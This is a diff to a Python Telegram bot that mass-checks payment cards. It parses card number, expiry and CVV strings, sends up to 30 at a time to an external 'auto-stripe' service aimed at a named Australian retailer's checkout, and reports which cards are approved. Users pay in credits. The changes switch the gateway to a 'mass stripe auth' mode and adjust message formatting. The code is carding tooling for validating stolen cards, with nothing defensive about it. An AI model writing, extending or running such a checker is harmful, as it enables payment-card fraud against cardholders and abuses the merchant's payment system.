@@ -1808,7 +1808,10 @@ from db import get_user, update_user
 from telegram.helpers import escape_markdown
 
 # --- SETTINGS ---
-API_URL_TEMPLATE = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
+API_URL_TEMPLATE = (
+    "https://darkboy-auto-stripe-y6qk.onrender.com/"
+    "gateway=massstripeauth/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
+)
 CONCURRENCY = 3  # check 3 cards in parallel
 RATE_LIMIT_SECONDS = 5
 user_last_command_time = {}
@@ -1827,6 +1830,7 @@ async def deduct_credit(user_id: int) -> bool:
 
 # --- HELPERS ---
 def extract_cards(text: str) -> list[str]:
+    """Extract cards in format 4444333322221111|MM|YY|CVV"""
     return re.findall(r'\d{12,16}[ |]\d{2,4}[ |]\d{2,4}[ |]\d{3,4}', text)
 
 async def check_single_card(session, card: str):
@@ -1841,17 +1845,17 @@ async def check_single_card(session, card: str):
         response_md = escape_markdown(response, version=2)
 
         if "approved" in status:
-            return f"`{card_md}`\n_i_✅ {response_md}_i_", "approved"
+            return f"`{card_md}`\n✅ {response_md}", "approved"
         elif "declined" in status:
-            return f"`{card_md}`\n_i_❌ {response_md}_i_", "declined"
+            return f"`{card_md}`\n❌ {response_md}", "declined"
         else:
-            return f"`{card_md}`\n_i_❌ {response_md}_i_", "error"
+            return f"`{card_md}`\n⚠️ {response_md}", "error"
     except (aiohttp.ClientError, asyncio.TimeoutError):
         card_md = escape_markdown(card, version=2)
-        return f"`{card_md}`\n_i_❌ Network Error_i_", "error"
+        return f"`{card_md}`\n❌ Network Error", "error"
     except Exception as e:
         card_md = escape_markdown(card, version=2)
-        return f"`{card_md}`\n_i_❌ {escape_markdown(str(e), version=2)}_i_", "error"
+        return f"`{card_md}`\n❌ {escape_markdown(str(e), version=2)}", "error"
 
 # --- MASS CHECK CORE ---
 async def run_mass_checker(msg, cards, user_id):
@@ -1862,12 +1866,12 @@ async def run_mass_checker(msg, cards, user_id):
 
     bullet = "[⌇]"
     bullet_link = f"[{escape_markdown(bullet, version=2)}]({BULLET_GROUP_LINK})"
-    gateway_text = escape_markdown("Gateway ➜ #𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱", version=2)
+    gateway_text = escape_markdown("Gateway ➜ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵", version=2)
     status_text = escape_markdown("Status ➜ Checking 🔎...", version=2)
 
-    # Send initial processing message
+    # Initial processing message
     initial_text = (
-        "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n"
+        "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳```\n"
         f"{bullet_link} {gateway_text}\n"
         f"{bullet_link} {status_text}\n"
     )
@@ -1899,7 +1903,7 @@ async def run_mass_checker(msg, cards, user_id):
                 elapsed = round(time.time() - start_time, 2)
 
                 header = (
-                    "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n"
+                    "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳```\n"
                     f"{bullet_link} {gateway_text}\n"
                     f"{bullet_link} Total ⌁ {counters['checked']}/{total}\n"
                     f"{bullet_link} Approved ⌁ {counters['approved']}\n"
@@ -1909,7 +1913,7 @@ async def run_mass_checker(msg, cards, user_id):
                     "──────── ⸙ ─────────"
                 )
 
-                content = header + "\n" + "\n──────── ⸙ ─────────\n".join(results)
+                content = header + "\n" + "\n──────── ⸙ ─────────\n".join(results[-20:])
                 try:
                     await msg.edit_text(content, parse_mode="MarkdownV2", disable_web_page_preview=True)
                 except TelegramError:
@@ -1935,7 +1939,7 @@ async def mass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-    # Credit
+    # Credit check
     if not await deduct_credit(user_id):
         await update.message.reply_text("❌ You have no credits.", parse_mode="HTML")
         return
@@ -1960,13 +1964,14 @@ async def mass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         cards = cards[:30]
 
-    # Initial message
+    # Initial reply
     msg = await update.message.reply_text(
         "⏳ <b>Processing cards...</b>", parse_mode="HTML"
     )
 
-    # Run mass checker in background
+    # Run mass checker
     asyncio.create_task(run_mass_checker(msg, cards, user_id))
+
 
 
 
